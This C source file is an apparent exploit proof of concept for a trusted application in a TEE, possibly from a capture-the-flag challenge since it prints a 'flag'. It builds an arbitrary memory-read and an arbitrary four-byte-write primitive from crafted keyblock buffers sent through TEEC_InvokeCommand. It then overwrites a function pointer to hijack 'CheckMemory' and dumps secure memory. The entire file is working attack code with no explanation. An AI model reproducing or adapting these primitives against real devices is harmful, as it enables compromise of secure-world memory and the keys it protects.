#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

uint32_t leak_mem(uint32_t address, TEEC_Context *context, TEEC_Session *session)
{
    void* mem_area1 = malloc(0x370);
    memset(mem_area1, 0, 0x370);

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
    op.params[0].tmpref.size =  0x370;
    // Data gets writen to arbitrary location
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[1].value.a = address;
    op.params[1].value.b = address;
    uint32_t err_origin;

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
    if (res != 0) {
        printf("\t read address at 0x%x, value: 0x%x\n", address, *(int*)mem_area1);
        printf("\t ret: %x :/\n", res);
    }
    return *(uint32_t*)mem_area1;
}

void arb_write_4_bytes(uint32_t address, uint32_t value, TEEC_Context *context, TEEC_Session *session)
{
    void* mem_area1 = malloc(0x370);
    memset(mem_area1, 0, 0x370);
    int* int_mem_area = (int*)mem_area1;
    *(uint8_t *)(mem_area1) = 0x4B;
    *(uint8_t *)(mem_area1 + 1) = 0x42;
    *(uint8_t *)(mem_area1 + 2) = 0x50;
    *(uint8_t *)(mem_area1 + 3) = 0x4D;
    int_mem_area[17] = 1;
    int_mem_area[18] = value;
    
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
    op.params[0].tmpref.size =  0x370; 
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
                                     TEEC_NONE, TEEC_NONE); 
    op.params[1].value.a = address;
    op.params[1].value.b = 4;
    uint32_t err_origin;

    //TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
    TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
    if (res != 0) {
        printf("\t overwrite return address at 0x%x, value: 0x%x\n", address, value);
        printf("\t ret: %x :/\n", res);
    }
}


int main(int argc, char **argv)
{
    char* ta = "08110000000000000000000000000000";
    unsigned char hex_b[0x40] = {0}; 
    hex2bytes(ta,hex_b);
    TEEC_Context context;
    TEEC_Session session;
    TEEC_UUID *uuid = (TEEC_UUID *)malloc(sizeof(TEEC_UUID));
    uint32_t timeLow;
    uuid->timeLow = (uint32_t)hex_b[0] << 24 |
      (uint32_t)hex_b[1] << 16 |
      (uint32_t)hex_b[2] << 8  |
      (uint32_t)hex_b[3];
    uuid->timeMid = (uint16_t)hex_b[4] << 8 | (uint16_t)hex_b[5];
    uuid->timeHiAndVersion = (uint16_t)hex_b[6] << 8 | (uint16_t)hex_b[7];
    for(int i = 0; i<8; i++){
        uuid->clockSeqAndNode[i] = (uint8_t)hex_b[8+i];
    }

    uint32_t err_origin;
    TEEC_Result res;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    printf("[+] hijacking CheckMemory...\n");
    //arb_write_4_bytes(0x8000, 0x402b04, &context, &session);
    arb_write_4_bytes(0x1d190, 0x402b04, &context, &session);
    int* leak_buf = (int*)malloc(0x400);
    int do_read=0x61a000;
    for(int i=0;i<0x10;i++){
	leak_buf[i] = leak_mem(do_read+i*4, &context, &session);
    }
    printf("flag: %s\n", (char*)leak_buf);
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
